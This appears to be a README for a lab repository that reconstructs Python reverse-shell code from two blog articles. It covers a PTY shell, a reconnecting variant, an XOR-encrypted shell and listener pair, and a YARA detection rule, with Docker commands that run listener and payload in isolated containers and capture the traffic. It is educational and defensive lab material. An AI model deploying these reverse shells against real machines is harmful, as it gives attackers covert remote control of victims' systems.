# Reverse-shell article reconstruction

This is a best-effort reconstruction of the code published in [Part 1](https://medium.com/@stavinfernandes2098/how-hard-is-it-to-build-a-reverse-shell-in-python-79082dada876) and [Part 2](https://medium.com/@stavinfernandes2098/building-a-python-reverse-shell-part-2-encryption-resilience-detection-001209ce6e92). It is not the deleted original folder: unpublished files, original filenames, and local changes cannot be recovered from the posts.

## Files

- `shell.py`: Part 1 PTY shell.
- `reconnect_shell.py`: Part 2 reconnect loop with capped backoff and jitter.
- `encrypted_shell.py` and `encrypted_listener.py`: Part 2 XOR relay, corrected beyond the published snippet so the pair actually works.
- `reverse_shell.yar`: Part 2 YARA example.

**Part 2 XOR corrections:** the published snippets defined `send_encrypted`/`recv_encrypted` without ever calling them, so traffic was plaintext and the listener could not drive a shell. This version replaces `pty.spawn` with a `pty.fork()` relay that XORs both directions between the PTY and the socket, frames messages so terminal resize events travel alongside data, keeps one keystream per direction across frames so TCP chunk boundaries cannot desynchronise it, and makes the listener bidirectional with raw terminal input and SIGWINCH forwarding. Remaining weakness: a short repeating XOR key with no authentication — lab use only.

## Isolated Docker lab (Parts 1 and 2)

The image contains every script from both parts. The `--internal` network blocks container access to external networks, but it is not full isolation from the Docker host; the host may still reach container IPs. No ports are published. The image does not start anything on its own — each role is launched explicitly.

Build the image and create the internal lab network:

```sh
docker build -t revshell-lab .
docker network create --internal revshell-lab
```

If `revshell-lab` already exists, inspect it with `docker network inspect revshell-lab`. Remove it only if it belongs to this lab.

Start one attacker and one victim container from that same image:

```sh
docker run -dit --name revshell-attacker --network revshell-lab --network-alias attacker revshell-lab
docker run -dit --name revshell-victim --network revshell-lab revshell-lab
```

Part 1, plaintext PTY shell (listener in one terminal, payload in another):

```sh
docker exec -it revshell-attacker nc -lvn 443
docker exec -it revshell-victim python3 /opt/revshell/shell.py
```

Part 2, plaintext reconnect variant — same `nc` listener, different payload:

```sh
docker exec -it revshell-victim python3 /opt/revshell/reconnect_shell.py
```

Part 2, encrypted pair (listener in one terminal, payload in another):

```sh
docker exec -it revshell-attacker python3 /opt/revshell/encrypted_listener.py
docker exec -it revshell-victim python3 /opt/revshell/encrypted_shell.py
```

Detection example against the packaged sources:

```sh
docker exec revshell-attacker sh -c 'yara /opt/revshell/reverse_shell.yar /opt/revshell/*.py'
```

## One-shot verification

`./verify.sh` builds the image if needed, starts two throwaway containers, runs a plaintext session (Part 1) and an encrypted session (Part 2), and checks that `id` executed and a unique marker came back through each channel. It also checks that a clean session end waits before reconnecting, and that both payload and listener drop unknown or oversized frames and stay usable. It prints PASS/FAIL and exits non-zero if any check fails.

## Packet capture (Wireshark)

`tcpdump` is installed in the image. Capture on the attacker's interface while a session runs, then copy the pcap to the host:

```sh
docker exec -d revshell-attacker tcpdump -i eth0 -s 0 -U -w /tmp/part2.pcap 'tcp port 443'
# run the listener and payload as described above, then:
docker exec revshell-attacker pkill -x tcpdump
docker cp revshell-attacker:/tmp/part2.pcap ./part2.pcap
open -a Wireshark ./part2.pcap
```

In Wireshark, decode TCP port 443 as plain data (Analyze → Decode As… → None) and use Follow → TCP Stream → Raw. Part 1 shows the shell in cleartext; Part 2 shows XOR bytes. Docker Desktop keeps container traffic inside its VM, so capture from inside a container rather than on the host.

`-s 0` captures full payloads, so a capture records everything typed and printed in the shell. Only run synthetic commands while capture is active, never handle real credentials or secrets in a recorded session, and do not commit generated pcaps. The samples in `captures/` contain only test commands; `captures/`, `*.pcap`, and `*.pcapng` are excluded by `.gitignore`.

Cleanup:

```sh
docker stop revshell-victim revshell-attacker
docker rm revshell-victim revshell-attacker
docker network rm revshell-lab
```

The container runs as root because the listener binds port 443. Keep this lab isolated. The articles do not provide the deleted folder's original manifest, tests, or any unpublished code.
